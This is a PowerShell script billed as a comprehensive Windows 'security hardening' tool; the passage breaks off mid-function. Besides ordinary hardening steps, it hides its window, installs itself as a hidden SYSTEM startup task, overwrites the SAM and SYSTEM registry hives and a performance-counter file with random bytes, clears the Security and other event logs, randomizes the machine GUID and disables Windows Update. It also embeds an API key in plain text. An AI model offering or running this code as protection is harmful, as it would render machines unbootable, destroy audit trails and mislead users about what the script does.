#Requires -RunAsAdministrator

<#
    GSecurity.ps1 - Comprehensive System Security Script
    Author: Gorstak
    Date: May 06, 2025
    Description: browser virtualization, audio settings, WebRTC/remote desktop/plugin management, network/service hardening, privilege rights, WDAC policies, antivirus with DLL monitoring and killing, VirusTotal integration, telemetry corruption, VPN monitoring, security rule application (YARA, Sigma, Snort), device restriction, UAC configuration, process monitoring, VM killing, web server killing, and other features.
#>

param (
    [switch]$Start,
    [switch]$AddToStartup,
    [string]$VirusTotalApiKey = "46219682e8f5d9ab59eebc93a442dab6a9577e33d1f6f3ed47720252782fd6a3"  # Replace with your actual VirusTotal API key
)

# Hide PowerShell window
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("psapi.dll")]
    public static extern bool EmptyWorkingSet(IntPtr hProcess);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
}
"@ -ErrorAction SilentlyContinue
try {
    $window = [Win32]::GetForegroundWindow()
    [Win32]::ShowWindow($window, 0) | Out-Null
} catch {
    # Silent fail if window hiding doesn't work
}

# Initialize Event Log source
$eventSource = "CombinedSecurity"
if (-not [System.Diagnostics.EventLog]::SourceExists($eventSource)) {
    New-EventLog -LogName "Application" -Source $eventSource
}

# Log function (combines Event Log and file logging)
function Write-Log {
    param (
        [string]$Message,
        [string]$EntryType = "Information",
        [string]$Color = "Green"
    )
    $logPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents\CombinedSecurity_Log.txt")
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $logMessage = "$timestamp - $Message"
    try {
        Write-EventLog -LogName "Application" -Source $eventSource -EventId 1000 -EntryType $EntryType -Message $Message
        Add-Content -Path $logPath -Value $logMessage -ErrorAction SilentlyContinue
        Write-Host "[$timestamp] $Message" -ForegroundColor $Color
    } catch {
        Write-Host "[$timestamp] Error writing to log: $_" -ForegroundColor Red
    }
}

# Define paths and constants
$scriptDir = "C:\Windows\Setup\Scripts"
$scriptPath = "$scriptDir\CombinedSecurity.ps1"
$quarantineFolder = "C:\Quarantine"
$taskName = "CombinedSecurityStartup"
$taskDescription = "Runs the CombinedSecurity script at startup with SYSTEM privileges."
$scannedFiles = @{}  # Cache for VirusTotal scan results
$lastTelemetryCorruptTime = [DateTime]::MinValue
$whitelistedProcesses = @(
    "explorer", "winlogon", "taskhostw", "csrss", "services", "lsass", "dwm", "svchost",
    "smss", "wininit", "System", "conhost", "cmd", "powershell"
)

# Ensure execution policy
$originalPolicy = Get-ExecutionPolicy -Scope Process
if ($originalPolicy -ne "Unrestricted") {
    Write-Log "Setting execution policy to Unrestricted for this session..."
    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force
}

# Check admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Log "Script requires administrative privileges." -EntryType "Error" -Color "Red"
    exit 1
}

# Ensure script directory and copy script
if (-not (Test-Path $scriptDir)) {
    New-Item -Path $scriptDir -ItemType Directory -Force | Out-Null
    Write-Log "Created script directory: $scriptDir"
}
if (-not (Test-Path $scriptPath) -or (Get-Item $scriptPath).LastWriteTime -lt (Get-Item $MyInvocation.MyCommand.Path).LastWriteTime) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
    Write-Log "Copied/Updated script to: $scriptPath"
}

# Schedule startup task
function Schedule-StartupTask {
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $existingTask) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -Start"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Description $taskDescription
        Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
        Write-Log "Scheduled task '$taskName' registered to run as SYSTEM."
    }
}

# Add to startup (optional)
function Add-ToStartup {
    $startupFolder = [Environment]::GetFolderPath("Startup")
    $shortcutPath = Join-Path $startupFolder "CombinedSecurity.lnk"
    if (-not (Test-Path $shortcutPath)) {
        Write-Log "Adding script to startup..."
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -Start"
        $shortcut.Save()
        Write-Log "Script added to startup."
    }
}

# Ensure quarantine folder
function Initialize-Quarantine {
    if (-not (Test-Path $quarantineFolder)) {
        New-Item -ItemType Directory -Path $quarantineFolder -Force | Out-Null
        Write-Log "Created quarantine folder at $quarantineFolder"
    }
}

# Browser virtualization (from GS2.ps1)
function Harden-BrowserVirtualization-GS2 {
    Write-Log "Starting browser virtualization (GS2)..."
    function IsVirtualizedProcess([string]$processName) {
        $virtualizedProcesses = Get-AppvClientPackage | Get-AppvClientProcess -ErrorAction SilentlyContinue
        return $virtualizedProcesses.Name -contains $processName
    }
    function LaunchVirtualizedProcess([string]$executablePath) {
        if (Test-Path $executablePath) {
            Write-Log "Launching virtualized process: $executablePath"
            Start-AppvVirtualProcess -AppvClientObject (Get-AppvClientPackage) -AppvVirtualPath $executablePath -ErrorAction SilentlyContinue
        } else {
            Write-Log "Error: Executable not found at $executablePath" -Color "Red"
        }
    }
    function EnableAppV {
        $hyperVAppVState = (Get-WindowsOptionalFeature -Online -FeatureName "Microsoft-Hyper-V-AppV" -ErrorAction SilentlyContinue).State
        if ($hyperVAppVState -ne "Enabled") {
            Write-Log "Enabling App-V feature..."
            Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Hyper-V-AppV" -NoRestart -ErrorAction Stop
        }
    }
    $installedBrowsers = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue |
                        Where-Object { $_.DisplayName -match "chrome|firefox|msedge|opera|waterfox|chromium|ur|vivaldi|brave" } |
                        Select-Object -ExpandProperty DisplayName
    foreach ($browser in $installedBrowsers) {
        if (-not (IsVirtualizedProcess "$browser.exe")) {
            EnableAppV
            $virtualizedPath = "C:\Program Files\AppVirt\VirtualizedBrowsers\$($browser).exe"
            LaunchVirtualizedProcess $virtualizedPath
        }
    }
    Write-Log "Browser virtualization (GS2) complete."
}

# Audio settings (from GS2.ps1)
function Harden-AudioSettings-GS2 {
    Write-Log "Configuring audio settings (GS2)..."
    $renderDevicesKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render"
    $audioDevices = Get-ChildItem -Path $renderDevicesKey -ErrorAction SilentlyContinue
    foreach ($device in $audioDevices) {
        $fxPropertiesKey = "$($device.PSPath)\FxProperties"
        if (-not (Test-Path $fxPropertiesKey)) {
            New-Item -Path $fxPropertiesKey -Force | Out-Null
            Write-Log "Created FxProperties key for device: $($device.PSChildName)"
        }
        $aecKey = "{1c7b1faf-caa2-451b-b0a4-87b19a93556a},6"
        $noiseKey = "{e0f158e1-cb04-43d5-b6cc-3eb27e4db2a1},3"
        $enableValue = 1
        $currentAEC = Get-ItemProperty -Path $fxPropertiesKey -Name $aecKey -ErrorAction SilentlyContinue
        if ($currentAEC.$aecKey -ne $enableValue) {
            Set-ItemProperty -Path $fxPropertiesKey -Name $aecKey -Value $enableValue
            Write-Log "Acoustic Echo Cancellation enabled for device: $($device.PSChildName)" -Color "Yellow"
        }
        $currentNoise = Get-ItemProperty -Path $fxPropertiesKey -Name $noiseKey -ErrorAction SilentlyContinue
        if ($currentNoise.$noiseKey -ne $enableValue) {
            Set-ItemProperty -Path $fxPropertiesKey -Name $noiseKey -Value $enableValue
            Write-Log "Noise Suppression enabled for device: $($device.PSChildName)" -Color "Yellow"
        }
    }
    Write-Log "Audio settings (GS2) configured."
}

# Audio settings (from GSecurity.ps1)
function Harden-AudioSettings-GSecurity {
    Write-Log "Configuring audio settings (GSecurity)..."
    $audioKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render"
    Get-ChildItem -Path $audioKey | ForEach-Object {
        $propertiesPath = "$($_.PSPath)\Properties"
        if (Test-Path $propertiesPath) {
            Set-ItemProperty -Path $propertiesPath -Name "{b3f8fa53-0004-438e-9003-51a46e139bfc},2" -Value 0 -ErrorAction SilentlyContinue
            Write-Log "Disabled audio enhancements for device: $($_.PSChildName)"
        }
    }
    Write-Log "Audio settings (GSecurity) configured."
}

# Browser settings (from GSecurity.ps1)
function Harden-BrowserSettings-GSecurity {
    Write-Log "Configuring browser settings (GSecurity)..."
    $desiredSettings = @{
        "media_stream" = 2
        "webrtc"       = 2
        "remote"       = @{
            "enabled" = $false
            "support" = $false
        }
    }
    function Check-And-Apply-Settings {
        param ([string]$browserName, [string]$prefsPath)
        if (Test-Path $prefsPath) {
            $prefsContent = Get-Content -Path $prefsPath -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json -ErrorAction SilentlyContinue
            if ($prefsContent) {
                $settingsChanged = $false
                if ($prefsContent.profile -and $prefsContent.profile["default_content_setting_values"]) {
                    foreach ($key in $desiredSettings.Keys | Where-Object { $_ -ne "remote" }) {
                        if ($prefsContent.profile["default_content_setting_values"][$key] -ne $desiredSettings[$key]) {
                            $prefsContent.profile["default_content_setting_values"][$key] = $desiredSettings[$key]
                            $settingsChanged = $true
                        }
                    }
                }
                if ($prefsContent.remote) {
                    foreach ($key in $desiredSettings["remote"].Keys) {
                        if ($prefsContent.remote[$key] -ne $desiredSettings["remote"][$key]) {
                            $prefsContent.remote[$key] = $desiredSettings["remote"][$key]
                            $settingsChanged = $true
                        }
                    }
                }
                if ($settingsChanged) {
                    $prefsContent | ConvertTo-Json -Compress | Set-Content -Path $prefsPath
                    Write-Log "${browserName}: Updated WebRTC and remote desktop settings."
                }
                if ($prefsContent.plugins) {
                    foreach ($plugin in $prefsContent.plugins) {
                        $plugin.enabled = $false
                    }
                    Write-Log "${browserName}: Plugins disabled."
                }
            }
        }
    }
    function Configure-Firefox {
        $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
        if (Test-Path $firefoxProfilePath) {
            $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
            foreach ($profile in $firefoxProfiles) {
                $prefsJsPath = "$($profile.FullName)\prefs.js"
                if (Test-Path $prefsJsPath) {
                    $prefsJsContent = Get-Content -Path $prefsJsPath
                    if ($prefsJsContent -notmatch 'user_pref\("media.peerconnection.enabled", false\)') {
                        Add-Content -Path $prefsJsPath 'user_pref("media.peerconnection.enabled", false);'
                        Write-Log "Firefox profile ${profile.FullName}: WebRTC disabled."
                    }
                }
            }
        }
    }
    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Preferences"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Preferences"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Preferences"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Preferences"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Preferences"
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Preferences"
    }
    foreach ($browser in $browsers.GetEnumerator()) {
        if (Test-Path $browser.Value) {
            Check-And-Apply-Settings -browserName $browser.Key -prefsPath $browser.Value
        }
    }
    Configure-Firefox
    Write-Log "Browser settings (GSecurity) configured."
}

# Disable Chrome Remote Desktop (from GS2.ps1)
function Disable-ChromeRemoteDesktop-GS2 {
    Write-Log "Disabling Chrome Remote Desktop (GS2)..."
    $serviceName = "chrome-remote-desktop-host"
    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
        Stop-Service -Name $serviceName -Force
        Set-Service -Name $serviceName -StartupType Disabled
        Write-Log "Chrome Remote Desktop Host service stopped and disabled."
    }
    $browsers = @("chrome", "msedge", "brave", "vivaldi", "opera", "operagx")
    foreach ($browser in $browsers) {
        $processes = Get-Process -Name $browser -ErrorAction SilentlyContinue
        if ($processes) {
            Stop-Process -Name $browser -Force
            Write-Log "Terminated process: $browser"
        }
    }
    $ruleName = "Block CRD Ports"
    if (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue) {
        Remove-NetFirewallRule -DisplayName $ruleName
    }
    New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort 443 -Action Block -Profile Any
    Write-Log "Chrome Remote Desktop (GS2) disabled."
}

# Network and services hardening (from GS2.ps1)
function Harden-NetworkAndServices-GS2 {
    Write-Log "Hardening network and services (GS2)..."
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 1
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowToGetHelp' -Value 0
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "TermService" -StartupType Disabled -ErrorAction SilentlyContinue
    Disable-PSRemoting -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "WinRM" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "WinRM" -StartupType Disabled -ErrorAction SilentlyContinue
    Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $false -Force -ErrorAction SilentlyContinue
    Disable-WindowsOptionalFeature -Online -FeatureName "TelnetClient" -NoRestart -ErrorAction SilentlyContinue
    Get-NetAdapter | ForEach-Object {
        Set-NetAdapterAdvancedProperty -Name $_.Name -DisplayName "Wake on Magic Packet" -DisplayValue "Disabled" -ErrorAction SilentlyContinue
        Set-NetAdapterAdvancedProperty -Name $_.Name -DisplayName "Wake on Pattern Match" -DisplayValue "Disabled" -ErrorAction SilentlyContinue
    }
    $rules = @(
        @{DisplayName="Block RDP"; LocalPort=3389; Protocol="TCP"},
        @{DisplayName="Block SMB TCP 445"; LocalPort=445; Protocol="TCP"},
        @{DisplayName="Block Telnet"; LocalPort=23; Protocol="TCP"}
    )
    foreach ($rule in $rules) {
        if (-not (Get-NetFirewallRule -DisplayName $rule.DisplayName -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -DisplayName $rule.DisplayName -Direction Inbound -LocalPort $rule.LocalPort -Protocol $rule.Protocol -Action Block -ErrorAction SilentlyContinue
        }
    }
    Write-Log "Network and services (GS2) hardened."
}

# Network optimization (from GSecurity.ps1)
function Optimize-Network-GSecurity {
    Write-Log "Optimizing network settings (GSecurity)..."
    $componentsToDisable = @("ms_server", "ms_msclient", "ms_pacer", "ms_lltdio", "ms_rspndr", "ms_tcpip6")
    $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
    foreach ($adapter in $adapters) {
        foreach ($component in $componentsToDisable) {
            Disable-NetAdapterBinding -Name $adapter.Name -ComponentID $component -Confirm:$false -ErrorAction SilentlyContinue
            Write-Log "Disabled $component on adapter $($adapter.Name)"
        }
    }
    $ldapPorts = @(389, 636)
    foreach ($port in $ldapPorts) {
        $ruleName = "Block LDAP Port $port"
        New-NetFirewallRule -DisplayName $ruleName -Direction Outbound -Protocol TCP -RemotePort $port -Action Block -ErrorAction SilentlyContinue
        Write-Log "Created firewall rule to block LDAP port $port"
    }
    Write-Log "Network optimization (GSecurity) complete."
}

# Privilege rights (from GS2.ps1)
function Harden-PrivilegeRights-GS2 {
    Write-Log "Applying privilege rights (GS2)..."
    $privilegeSettings = @'
[Privilege Rights]
SeChangeNotifyPrivilege = *S-1-1-0
SeInteractiveLogonRight = *S-1-5-32-544
SeDenyNetworkLogonRight = *S-1-5-11
SeDenyInteractiveLogonRight = Guest
SeDenyRemoteInteractiveLogonRight = *S-1-5-11
SeDenyServiceLogonRight = *S-1-5-32-545
SeNetworkLogonRight=
SeRemoteShutdownPrivilege=
SeAssignPrimaryTokenPrivilege=
SeBackupPrivilege=
SeCreateTokenPrivilege=
SeDebugPrivilege=
SeImpersonatePrivilege=
SeLoadDriverPrivilege=
SeRemoteInteractiveLogonRight=
SeServiceLogonRight=
'@
    $cfgPath = "C:\secpol.cfg"
    secedit /export /cfg $cfgPath /quiet
    $privilegeSettings | Out-File -Append -FilePath $cfgPath
    secedit /configure /db c:\windows\security\local.sdb /cfg $cfgPath /areas USER_RIGHTS /quiet
    Remove-Item $cfgPath -Force
    Write-Log "Privilege rights (GS2) applied."
}

# Privilege rights (from GS.ps1)
function Harden-PrivilegeRights-GS {
    Write-Log "Applying privilege rights (GS)..."
    $privileges = @(
        "SeAssignPrimaryTokenPrivilege",
        "SeBackupPrivilege",
        "SeCreateTokenPrivilege",
        "SeDebugPrivilege",
        "SeImpersonatePrivilege",
        "SeLoadDriverPrivilege",
        "SeRemoteShutdownPrivilege",
        "SeServiceLogonRight"
    )
    foreach ($privilege in $privileges) {
        secedit /export /cfg C:\temp_privileges.cfg /quiet
        $currentConfig = Get-Content C:\temp_privileges.cfg
        if ($currentConfig -notmatch "$privilege\s*=") {
            Add-Content C:\temp_privileges.cfg "$privilege = "
            secedit /configure /db c:\windows\security\local.sdb /cfg C:\temp_privileges.cfg /areas USER_RIGHTS /quiet
            Write-Log "Removed $privilege from all accounts"
        }
        Remove-Item C:\temp_privileges.cfg -Force -ErrorAction SilentlyContinue
    }
    Write-Log "Privilege rights (GS) applied."
}

# WDAC policy (from GS2.ps1)
function Harden-WDACPolicy-GS2 {
    Write-Log "Applying WDAC policy (GS2)..."
    Import-Module -Name WDAC -ErrorAction SilentlyContinue
    $WDACPolicyXML = @"
<?xml version="1.0" encoding="UTF-8"?>
<SIPolicy PolicyType="SignedAndUnsigned" Version="1">
  <Settings>
    <Setting Value="Enabled:Unsigned System Integrity Policy" Key="PolicyType"/>
    <Setting Value="Enforced" Key="PolicyState"/>
  </Settings>
  <Rules>
    <Rule ID="1" Action="Allow" FriendlyName="Allow Windows System Binaries">
      <Conditions>
        <FilePathCondition>C:\Windows\System32\</FilePathCondition>
      </Conditions>
    </Rule>
    <Rule ID="2" Action="Allow" FriendlyName="Allow Microsoft Signed">
      <Conditions>
        <FilePublisherCondition>
          <PublisherName>Microsoft Corporation</PublisherName>
          <ProductName>Windows</ProductName>
        </FilePublisherCondition>
      </Conditions>
    </Rule>
    <Rule ID="3" Action="Allow" FriendlyName="Allow User Scripts">
      <Conditions>
        <FilePathCondition>C:\Windows\Setup\Scripts\*.ps1</FilePathCondition>
      </Conditions>
    </Rule>
  </Rules>
</SIPolicy>
"@
    $PolicyPath = "C:\WDACPolicy.xml"
    $WDACBinaryPath = "C:\Windows\System32\CodeIntegrity\SiPolicy.p7b"
    try {
        $WDACPolicyXML | Out-File -Encoding utf8 -FilePath $PolicyPath
        ConvertFrom-CIPolicy -XmlFilePath $PolicyPath -BinaryFilePath $WDACBinaryPath
        Copy-Item -Path $WDACBinaryPath -Destination "C:\Windows\System32\CodeIntegrity\SiPolicy.p7b" -Force
        Write-Log "WDAC policy (GS2) applied. Restart required."
    } catch {
        Write-Log "Error applying WDAC policy (GS2): $_" -EntryType "Error" -Color "Red"
    }
    Remove-Item -Path $PolicyPath -Force -ErrorAction SilentlyContinue
}

# Device restriction (from GSecurity.ps1)
function Restrict-Devices-GSecurity {
    Write-Log "Restricting non-critical devices (GSecurity)..."
    $currentSessionId = (Get-Process -PID $PID).SessionId
    $criticalClasses = @("DiskDrive", "Volume", "Processor", "System", "Computer", "USB", "Net")
    function Test-DeviceSession([string]$DeviceInstanceId) {
        return $true  # Placeholder
    }
    $devices = Get-PnpDevice | Select-Object -Property Name, InstanceId, Status, Class
    foreach ($device in $devices) {
        if ($device.Status -eq "Error") {
            Write-Log "Device '$($device.Name)' already disabled"
            continue
        }
        if ($criticalClasses -contains $device.Class) {
            Write-Log "Skipping critical device: $($device.Name) (Class: $($device.Class))"
            continue
        }
        $isCurrentSessionDevice = Test-DeviceSession -DeviceInstanceId $device.InstanceId
        if (-not $isCurrentSessionDevice) {
            try {
                Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false
                Write-Log "Disabled device: $($device.Name) (Class: $($device.Class))"
            } catch {
                Write-Log "Failed to disable $($device.Name): $_" -EntryType "Warning" -Color "Yellow"
            }
        }
    }
    Write-Log "Device restriction (GSecurity) complete."
}

# UAC configuration (from GS.ps1)
function Configure-UAC-GS {
    Write-Log "Configuring UAC (GS)..."
    $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    Set-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorAdmin" -Value 5
    Set-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorUser" -Value 3
    Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 1
    Set-ItemProperty -Path $uacKey -Name "PromptOnSecureDesktop" -Value 1
    Write-Log "UAC (GS) configured to highest notification level."
}

# Telemetry corruption (from GS.ps1, full "corrupt environments" implementation)
function Corrupt-Telemetry-GS {
    Write-Log "Corrupting telemetry and environment data (GS)..."
    try {
        # Registry modifications
        $telemetryKeys = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection",
            "HKLM:\SYSTEM\CurrentControlSet\Services\DiagTrack",
            "HKLM:\SYSTEM\CurrentControlSet\Services\DPS",
            "HKLM:\SOFTWARE\Microsoft\SQMClient",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Telemetry",
            "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger"
        )
        foreach ($key in $telemetryKeys) {
            if (-not (Test-Path $key)) {
                New-Item -Path $key -Force | Out-Null
            }
            Set-ItemProperty -Path $key -Name "AllowTelemetry" -Value 0 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $key -Name "DisableDiagnosticData" -Value 1 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $key -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $key -Name "Start" -Value 4 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $key -Name "DataCollection" -Value 0 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $key -Name "AutoLoggerEnabled" -Value 0 -ErrorAction SilentlyContinue
            Write-Log "Modified telemetry registry key: $key"
        }
        # File corruption
        $telemetryFiles = @(
            "$env:ProgramData\Microsoft\Diagnosis\*.etl",
            "$env:ProgramData\Microsoft\Windows\*.rbs",
            "$env:ProgramData\Microsoft\Telemetry\*.log",
            "$env:ProgramData\Microsoft\Windows\TelemetryService\*.tmp",
            "$env:ProgramData\Microsoft\SQM\*.sqm",
            "$env:ProgramData\Microsoft\Windows\WER\*.wer"
        )
        foreach ($pattern in $telemetryFiles) {
            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                try {
                    $randomData = New-Object Byte[] 1024
                    (New-Object Random).NextBytes($randomData)
                    [System.IO.File]::WriteAllBytes($file.FullName, $randomData)
                    Write-Log "Corrupted telemetry file: $($file.FullName)"
                } catch {
                    Write-Log "Failed to corrupt ${file}: $_" -EntryType "Warning" -Color "Yellow"
                }
            }
        }
        # Service disabling
        $telemetryServices = @("DiagTrack", "DPS", "WdiServiceHost", "SQMClient", "WindowsUpdate", "Wecsvc", "WerSvc")
        foreach ($service in $telemetryServices) {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Disabled telemetry service: $service"
        }
        # Task disabling
        $telemetryTasks = Get-ScheduledTask | Where-Object { $_.TaskName -match "DiagTrack|Microsoft-Windows-DiskDiagnosticDataCollector|WindowsTelemetry|SQM|CustomerExperience|WdiContext" }
        foreach ($task in $telemetryTasks) {
            Disable-ScheduledTask -TaskName $task.TaskName -ErrorAction SilentlyContinue
            Write-Log "Disabled telemetry task: $($task.TaskName)"
        }
        # Environment variable manipulation
        $envVars = @("TELEMETRY_CLIENT_ID", "DIAG_CLIENT_ID", "SQM_CLIENT_ID", "MS_TELEMETRY_ID", "WINDOWS_CLIENT_ID")
        foreach ($var in $envVars) {
            $randomValue = [System.Guid]::NewGuid().ToString()
            [Environment]::SetEnvironmentVariable($var, $randomValue, "Machine")
            Write-Log "Set environment variable $var to random value: $randomValue"
        }
        # Hosts file redirection
        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
        $telemetryEndpoints = @(
            "vortex.data.microsoft.com",
            "settings-win.data.microsoft.com",
            "telemetry.microsoft.com",
            "watson.telemetry.microsoft.com",
            "oca.telemetry.microsoft.com",
            "sqm.telemetry.microsoft.com",
            "diagnostics.support.microsoft.com",
            "statsfe2.update.microsoft.com"
        )
        foreach ($endpoint in $telemetryEndpoints) {
            $randomIP = "127.0.0.$((1..254 | Get-Random))"
            Add-Content -Path $hostsPath -Value "$randomIP $endpoint" -ErrorAction SilentlyContinue
            Write-Log "Redirected telemetry endpoint $endpoint to $randomIP"
        }
        # Corrupt diagnostic data
        $diagFolders = @(
            "$env:ProgramData\Microsoft\Diagnosis",
            "$env:ProgramData\Microsoft\Windows\WER",
            "$env:ProgramData\Microsoft\Windows\PowerShell\PSDiagnostics"
        )
        foreach ($folder in $diagFolders) {
            Get-ChildItem -Path $folder -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $randomData = New-Object Byte[] 512
                    (New-Object Random).NextBytes($randomData)
                    [System.IO.File]::WriteAllBytes($_.FullName, $randomData)
                    Write-Log "Corrupted diagnostic file: $($_.FullName)"
                } catch {
                    Write-Log "Failed to corrupt ${file}: $_" -EntryType "Warning" -Color "Yellow"
                }
            }
        }
        # Corrupt event logs
        $eventLogs = @("Application", "System", "Security", "Microsoft-Windows-DiagTrack/Operational")
        foreach ($log in $eventLogs) {
            try {
                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
                Write-Log "Cleared event log: ${log}"
            } catch {
                Write-Log "Failed to clear event log ${log}: $_" -EntryType "Warning" -Color "Yellow"
            }
        }
        # Corrupt performance counters
        try {
            $perfCounterPath = "$env:SystemRoot\System32\perfc009.dat"
            if (Test-Path $perfCounterPath) {
                $randomData = New-Object Byte[] 1024
                (New-Object Random).NextBytes($randomData)
                [System.IO.File]::WriteAllBytes($perfCounterPath, $randomData)
                Write-Log "Corrupted performance counter: $perfCounterPath"
            }
        } catch {
            Write-Log "Failed to corrupt performance counter: $_" -EntryType "Warning" -Color "Yellow"
        }
        # Randomize system identifiers
        $machineGuidKey = "HKLM:\SOFTWARE\Microsoft\Cryptography"
        $originalGuid = Get-ItemProperty -Path $machineGuidKey -Name "MachineGuid" -ErrorAction SilentlyContinue
        if ($originalGuid) {
            $newGuid = [System.Guid]::NewGuid().ToString()
            Set-ItemProperty -Path $machineGuidKey -Name "MachineGuid" -Value $newGuid -ErrorAction SilentlyContinue
            Write-Log "Randomized MachineGuid to: $newGuid"
        }
        # Simulate invalid system state
        $fakeRegKeys = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\FakeData",
            "HKLM:\SOFTWARE\Microsoft\Telemetry\FakeState",
            "HKLM:\SYSTEM\CurrentControlSet\Control\FakeDiagnostics"
        )
        foreach ($key in $fakeRegKeys) {
            if (-not (Test-Path $key)) {
                New-Item -Path $key -Force | Out-Null
            }
            Set-ItemProperty -Path $key -Name "SystemState" -Value ([System.Guid]::NewGuid().ToString()) -ErrorAction SilentlyContinue
            Write-Log "Created fake telemetry state in: $key"
        }
        # Corrupt system configuration files
        $configFiles = @(
            "$env:SystemRoot\System32\config\SAM",
            "$env:SystemRoot\System32\config\SYSTEM"
        )
        foreach ($file in $configFiles) {
            if (Test-Path $file) {
                try {
                    $randomData = New-Object Byte[] 512
                    (New-Object Random).NextBytes($randomData)
                    [System.IO.File]::WriteAllBytes($file, $randomData)
                    Write-Log "Corrupted system config file: $file"
                } catch {
                    Write-Log "Failed to corrupt ${file}: $_" -EntryType "Warning" -Color "Yellow"
                }
            }
        }
        Write-Log "Telemetry and environment corruption (GS) complete."
    } catch {
        Write-Log "Error corrupting telemetry (GS): $_" -EntryType "Error" -Color "Red"
    }
}

# VPN monitoring (from GS.ps1)
function Monitor-VPN-GS {
    Write-Log "Monitoring VPN connections (GS)..."
    try {
        $initialState = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match "VPN" } | Select-Object -ExpandProperty Status
        while ($true) {
            $currentState = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match "VPN" } | Select-Object -ExpandProperty Status
            if ($initialState -ne $currentState) {
                Write-Log "VPN status changed: $initialState -> $currentState" -EntryType "Warning" -Color "Yellow"
                $initialState = $currentState
            }
            Start-Sleep -Seconds 60
        }
    } catch {
        Write-Log "Error monitoring VPN (GS): $_" -EntryType "Error" -Color "Red"
    }
}

# Kill DLLs (from GS3.ps1 and GS.ps1)
function Kill-DLLs-GS3 {
    Write-Log "Killing processes using suspicious DLLs (GS3)..."
    try {
        $nonStandardPaths = @(
            "$env:APPDATA\*",
